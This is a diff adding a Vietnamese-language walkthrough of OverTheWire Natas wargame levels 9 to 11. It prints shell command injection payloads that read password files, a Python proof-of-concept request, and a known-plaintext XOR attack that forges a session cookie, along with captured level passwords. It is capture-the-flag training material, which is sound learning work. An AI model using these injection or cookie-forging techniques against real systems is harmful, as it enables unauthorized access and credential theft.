@@ -453,3 +453,302 @@ Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 ***
 **URL:** [http://natas9.natas.labs.overthewire.org](http://natas9.natas.labs.overthewire.org) <br/>
 **Datum:** natas9-W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+Level này khi view sourcecode, ta nhận được mã PHP như sau:
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+```
+
+Nhìn vào ta có thể mường tượng ra, đây là nơi thực thi *command injection*
+
+Vì vậy ta thử fuzz input trên `; cat /etc/natas_webpass/natas10` hoặc `. /etc/natas_webpass/natas10`, ta nhận được pwd. Ở đây `;` sẽ ngắt dòng command trong shell và thực thi command khác.
+
+```text
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+```
+
+*Or the way*
+
+**POC:**
+
+```python
+import requests
+import re
+
+user = 'natas9'
+pwd = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
+
+url = 'http://%s.natas.labs.overthewire.org/' % user
+
+session = requests.Session()
+
+response = session.post(url, data={'needle':'. /etc/natas_webpass/natas10 #', 'submit' : 'submit'}, auth = (user, pwd))
+content = response.text
+
+print(content)
+```
+
+
+
+***
+# Natas Level 10 Solution
+***
+**URL:** [http://natas10.natas.labs.overthewire.org](http://natas10.natas.labs.overthewire.org) <br/>
+**Datum:** natas10-nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+Tương tự như level trước, nhưng giờ đã filter trường input, đây đoạn code **PHP** filter.
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+```
+
+Ta thử 1 số command như là `.* /etc/natas_webpass/natas11` hoặc `. /etc/natas_webpass/natas11 #` sẽ nhận được pwd của level 12. Về **POC - Python** có thể lấy từ level trước thay bằng `natas11`.
+
+```text
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+```
+
+
+
+***
+# Natas Level 11 Solution
+***
+**URL:** [http://natas11.natas.labs.overthewire.org](http://natas11.natas.labs.overthewire.org) <br/>
+**Datum:** natas11-U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+Level này source code cũng là mã PHP:
+
+```php
+<?
+
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data = loadData($defaultdata);
+
+if(array_key_exists("bgcolor",$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
+
+saveData($data);
+
+?>
+
+
+<?
+if($data["showpassword"] == "yes") {
+    print "The password for natas12 is <censored><br>";
+}
+
+?>
+```
+
+Oke, ta cần có **$data["showpassword"] == "yes"**.
+Trước đó, **$data** được lấy giá trị thông qua hàm **loadData()**.
+
+```php
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-fd]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+```
+
+Hiểu tổng quát, *$data* được lấy từ biến **data** của cookie (không có, thì tự động get mặc định), với các thao tác xử lý lần lượt là:
+
+```text
+base64_decode → xor_encrypt → json_decode
+```
+
+Quá trình này dễ thấy là đối xứng với các thao tác trong hàm **saveData()**:
+
+```text
+json_encode → xor_encrypt → base64_encode
+```
+
+Do *json_encode*, *json_decode*, *base64_encode*, *base64_decode* là các hàm có sẵn của PHP. Lúc này ta cần là hiểu được hàm *xor_encrypt*.
+
+Nhưng… khoan đã, nãy giờ chúng ta cứ lan man về vấn đề mã hóa cookie, vậy nó có ý nghĩa gì đối với task này?
+
+Hãy nhớ lại rằng, chúng ta phải có **$data["showpassword"] == "yes"**, nhưng biến *showpassword* được mặc định là *"no"* (trong khai báo *$defaultdata*), còn cái mà chúng ta có thể thay đổi chỉ là mỗi *bgcolor*. Vậy thì chỉ còn cách đọc hiểu cơ chế xử lý cookie của task, và chỉnh sửa nó thủ công mà thôi.
+
+Trở về với hàm *xor_encrypt()*:
+
+```php
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+ 
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+ 
+    return $outText;
+}
+```
+
+Rất dễ hiểu, là phép **XOR** với một dãy byte. Và do biến *$key* đã bị ẩn, nên ta cần tìm nó.
+
+Chúng ta có input, dựa trên *$data = $defaultdata*. Chúng ta cũng có output dựa trên giá trị cookie. Tóm tắt lại một chút:
+
+```bash
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+cookie['data'] = ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
+
+saveData() = setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+```
+
+Thực thi câu lệnh này để lấy input của hàm *xor_encrypt()*:
+
+```php
+echo json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+```
+
+```text
+{"showpassword":"no","bgcolor":"#ffffff"}
+```
+
+Tương tự như vậy, thực thi câu lệnh PHP sau để xác định output của hàm *xor_encrypt()*:
+
+```php
+echo base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
+```
+
+Như vậy, ta đã có input và ouput. Kết hợp với tính chất kinh điển của phép toán XOR ví dụ `plaintext ^ key = ciphertext` thì `plaintext ^ ciphertext = key`, như thế ta coi như có đủ dữ kiện cần thiết. Đoạn code dưới đây sẽ cho ta biết các byte lần lượt được dùng để **XOR** input thành output là gì:
+
+```python
+import base64
+import json
+
+ciphertext = b"ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="
+ciphertext = base64.decodebytes(ciphertext)
+plaintext = {"showpassword":"no", "bgcolor":"#ffffff"}
+# Here, we remove the space as JSON implementation in Python is different from PHP
+plaintext = json.dumps(plaintext).encode('utf-8').replace(b" ", b"")
+
+def xor_decrypt(plaintext, ciphertext):
+    secret = ""
+
+    for x in range(len(plaintext)):
+        secret += str(chr(ciphertext[x] ^ plaintext[x % len(plaintext)]))
+
+    return secret
+
+secret = xor_decrypt(ciphertext, plaintext)
+print(secret)
+
+# Result = qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+```
+
+Oke, vậy giờ ta cần encode lại cookie và set lại giá trị *showpassword = yes*:
+
+```python
+import base64
+import json
+
+key = b"qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw"
+new_cookie = {"showpassword":"yes", "bgcolor":"#ffffff"}
+new_cookie = json.dumps(new_cookie).encode('utf-8').replace(b" ", b"")
+
+def xor_encrypt(key, cookie):
+    data = ""
+    for x in range(len(key)):
+        data += str(chr(cookie[x] ^ key[x % len(key)]))
+
+    data = base64.encodebytes(data.encode('utf-8'))
+    return data
+
+data = xor_encrypt(key, new_cookie)
+print(data)
+
+# Result = ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+```
+
+Giờ ta chỉ cần chỉnh sửa cookie của mình trong trình duyệt bằng *Javascript console*:
+
+```javascript
+document.cookie="data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"
+```
+
+Oke, good job!
+
+```text
+The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+```
+
+> Will try to complete the rest of the journey, please stay tuned ..
+
+Cheering ...
+
+![Alt Text](https://media.giphy.com/media/SyemapFxj7TiM/giphy.gif)
+
